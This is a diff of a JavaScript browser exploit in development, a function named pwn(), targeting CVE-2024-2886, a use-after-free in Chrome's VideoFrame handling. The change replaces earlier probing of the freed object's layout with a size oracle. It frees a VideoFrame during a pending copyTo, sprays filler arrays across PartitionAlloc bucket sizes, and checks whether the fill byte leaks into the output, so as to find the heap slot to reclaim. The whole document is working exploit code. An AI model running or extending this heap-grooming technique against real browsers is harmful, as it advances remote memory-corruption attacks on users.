@@ -7,116 +7,85 @@
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
 
 async function pwn() {
-    log('CVE-2024-2886 — UAF structure analysis');
+    log('CVE-2024-2886 — C++ wrapper size oracle');
+    log('Finding freed VideoFrame wrapper size via spray sizes');
     log('');
 
     const canvas = new OffscreenCanvas(64, 64);
     const gl = canvas.getContext('webgl');
+
+    // Helper: does spray of given size affect the UAF output?
+    async function testSpraySize(spraySize, fillByte) {
+        gl.clearColor(1.0, 0.0, 0.0, 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.finish();
+
+        const frame = new VideoFrame(canvas, { timestamp: performance.now() });
+        const buf = new Uint8Array(frame.allocationSize());
+        const p = frame.copyTo(buf);
+        frame.close();
+
+        // Spray with specific size
+        const spray = [];
+        for (let i = 0; i < 200; i++) {
+            const s = new Uint8Array(spraySize);
+            s.fill(fillByte);
+            spray.push(s);
+        }
+
+        await p;
+        spray.length = 0;
+
+        // Check if fillByte appears in output
+        const hit = buf.some(b => b === fillByte);
+        return hit;
+    }
+
+    // Baseline: what bytes do we normally get?
     gl.clearColor(1.0, 0.0, 0.0, 1.0);
     gl.clear(gl.COLOR_BUFFER_BIT);
     gl.finish();
+    const frameB = new VideoFrame(canvas, { timestamp: 0 });
+    const bufB = new Uint8Array(frameB.allocationSize());
+    await frameB.copyTo(bufB);
+    frameB.close();
+    log('[baseline] size=' + bufB.length + ' first8: ' +
+        Array.from(bufB.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
 
-    // Baseline
-    const frameBase = new VideoFrame(canvas, { timestamp: 0 });
-    const bufBase = new Uint8Array(frameBase.allocationSize());
-    await frameBase.copyTo(bufBase);
-    frameBase.close();
-    log('[baseline] first 32 bytes:');
-    log('  ' + Array.from(bufBase.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-    log('[baseline] size: ' + bufBase.length);
-    log('');
-
-    // Test 1: spray with 0xBB - do we get 0xBB back?
-    {
-        gl.clearColor(1.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-        const frame = new VideoFrame(canvas, { timestamp: 1000 });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
-        const spray = [];
-        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xBB); spray.push(s); }
-        await p;
-        spray.length = 0;
-        log('[spray=0xBB] first 32 bytes:');
-        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-        const hasBB = buf.slice(0,32).some(b => b === 0xBB);
-        log('  contains 0xBB: ' + hasBB);
+    // The baseline bytes - we're looking for our spray byte 0xDD to appear
+    // 0xDD should not naturally appear in red frame data
+    const FILL = 0xDD;
+    if (bufB.some(b => b === FILL)) {
+        log('[!] 0xDD naturally in baseline - picking different byte');
     }
 
     log('');
+    log('Testing spray sizes (looking for 0xDD in output):');
 
-    // Test 2: spray with 0xCC
-    {
-        gl.clearColor(1.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-        const frame = new VideoFrame(canvas, { timestamp: 2000 });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
-        const spray = [];
-        for (let i = 0; i < 500; i++) { const s = new Uint8Array(512); s.fill(0xCC); spray.push(s); }
-        await p;
-        spray.length = 0;
-        log('[spray=0xCC] first 32 bytes:');
-        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-        const hasCC = buf.slice(0,32).some(b => b === 0xCC);
-        log('  contains 0xCC: ' + hasCC);
+    // Try common PartitionAlloc bucket sizes
+    // Chrome's PartitionAlloc uses sizes: 32, 64, 128, 192, 256, 320, 384, 448, 512,
+    // 576, 640, 704, 768, 832, 896, 960, 1024, 1152, 1280, 1408, 1536...
+    const sizes = [32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256,
+                   320, 384, 448, 512, 576, 640, 704, 768, 832, 896,
+                   960, 1024, 1088, 1152, 1280, 1408, 1536, 1664, 1792, 2048];
+
+    const hits = [];
+    for (const sz of sizes) {
+        const hit = await testSpraySize(sz, FILL);
+        log('  size=' + sz + ': ' + (hit ? 'HIT 0xDD FOUND' : 'miss'));
+        if (hit) hits.push(sz);
+        await new Promise(r => setTimeout(r, 50)); // small delay between tests
     }
 
     log('');
-
-    // Test 3: spray with structured data - fake a pointer-like pattern
-    // If we can control specific offsets we can fake a VideoFrame struct
-    {
-        gl.clearColor(1.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-        const frame = new VideoFrame(canvas, { timestamp: 3000 });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
-
-        // Spray with incrementing pattern so we can see exact offsets
-        const spray = [];
-        for (let i = 0; i < 500; i++) {
-            const s = new Uint8Array(512);
-            for (let j = 0; j < 512; j++) s[j] = j & 0xFF; // 0x00..0xFF pattern
-            spray.push(s);
-        }
-        await p;
-        spray.length = 0;
-
-        log('[spray=0x00..FF] first 64 bytes:');
-        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-        log('  ' + Array.from(buf.slice(32, 64)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-
-        // What offset in the spray pattern did copyTo read from?
-        const firstByte = buf[0];
-        log('  first byte 0x' + firstByte.toString(16) + ' -> spray offset ~0x' + firstByte.toString(16));
+    if (hits.length > 0) {
+        log('HIT sizes: ' + hits.join(', '));
+        log('Smallest hit = likely freed C++ wrapper size: ' + Math.min(...hits));
+        log('This is our spray target allocation size');
+    } else {
+        log('No hits - spray not reaching freed C++ object');
+        log('May need larger spray count or different approach');
     }
-
-    log('');
-
-    // Test 4: no spray at all — what do we get?
-    {
-        gl.clearColor(1.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-        const frame = new VideoFrame(canvas, { timestamp: 4000 });
-        const buf = new Uint8Array(frame.allocationSize());
-        const p = frame.copyTo(buf);
-        frame.close();
-        // No spray - what's naturally at that address?
-        await p;
-        log('[no spray] first 32 bytes:');
-        log('  ' + Array.from(buf.slice(0, 32)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
-    }
-
-    log('');
-    log('Analysis done. Compare patterns to understand freed object structure.');
 }
 
 pwn();
